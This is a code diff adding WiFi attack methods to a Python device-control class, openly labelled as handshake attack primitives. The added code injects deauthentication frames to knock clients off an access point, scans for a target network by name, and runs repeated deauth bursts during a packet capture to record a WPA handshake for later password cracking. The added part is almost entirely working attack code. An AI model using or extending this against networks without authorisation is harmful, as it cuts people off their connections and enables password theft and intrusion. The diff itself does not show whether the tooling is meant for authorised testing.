@@ -235,6 +235,72 @@ class Companion:
         cap["verified"] = bool(cap["sha256"]) and got.get("sha256", "") == cap["sha256"]
         return cap
 
+    # --- WiFi handshake attack primitives -------------------------------------
+    def deauth(self, bssid, sta="broadcast", ch=0, count=8, timeout=8.0):
+        """Inject deauth frames to knock a client off `bssid` (forces a re-auth →
+        fresh 4-way handshake). sta='broadcast' hits all clients."""
+        spec = f"companion wifi deauth bssid={bssid}"
+        if sta and sta != "broadcast":
+            spec += f" sta={sta}"
+        if ch:
+            spec += f" ch={ch}"
+        spec += f" count={count}"
+        return self.request(spec, timeout=timeout)
+
+    def find_ap(self, ssid, scan_secs=4.0):
+        """Scan (via the wifi stream) for an AP by SSID. Returns
+        {bssid, ch, ssid, rssi} or None."""
+        out = self.stream("wifi", duration=scan_secs)
+        best = None
+        for e in out["events"]:
+            if not e.startswith("wifi net") or " ssid=" not in e:
+                continue
+            name = e[e.find(" ssid=") + 6:]            # SSID is the line tail (may have spaces)
+            if name != ssid:
+                continue
+            d = dict(t.split("=", 1) for t in e.split() if "=" in t and not t.startswith("ssid="))
+            rssi = int(d.get("rssi", -999))
+            if best is None or rssi > best["rssi"]:
+                best = {"bssid": d.get("bssid", ""), "ch": int(d.get("ch", 0)),
+                        "ssid": name, "rssi": rssi}
+        return best
+
+    def capture_handshake(self, bssid="", ch=0, secs=20.0, deauth_count=8, rounds=3,
+                          local_path=None):
+        """Start a handshake (pcap) capture, fire `rounds` deauth bursts spread over
+        `secs` to elicit the handshake, then stop + fetch. Returns the capture dict
+        (path/bytes/samples/sha256/local/verified)."""
+        kind = "handshake"
+        if ch:
+            kind += f" ch={ch}"
+        if bssid:
+            kind += f" bssid={bssid}"
+        r = self.capture_start(kind)
+        if not r.ok:
+            raise RuntimeError(f"handshake capture start failed: {r.error or r.lines}")
+        rid = r.id
+        rounds = max(1, rounds)
+        slice_s = secs / rounds
+        for i in range(rounds):
+            if bssid and deauth_count:
+                self.deauth(bssid, ch=ch, count=deauth_count)
+            end = time.time() + slice_s
+            for fr in self._read_frames(end):   # drain progress EVTs; file logs on-device
+                if fr.type == "EVT" and fr.id == rid:
+                    pass
+        s = self.capture_stop()
+        if not s.ok:
+            raise RuntimeError(f"handshake capture stop failed: {s.error or s.lines}")
+        sm = _kv(s.lines)
+        cap = {"path": sm.get("path", ""), "bytes": int(sm.get("bytes", 0)),
+               "samples": int(sm.get("samples", 0)), "sha256": sm.get("sha256", ""),
+               "kind": "handshake"}
+        if cap["path"]:
+            got = self.file_get(cap["path"], local_path)
+            cap["local"] = got.get("path") or local_path
+            cap["verified"] = bool(cap["sha256"]) and got.get("sha256", "") == cap["sha256"]
+        return cap
+
 
 # --- transport-agnostic HELLO + challenge-response auth ---
 def hello_via(request, token="", timeout=6.0) -> dict:
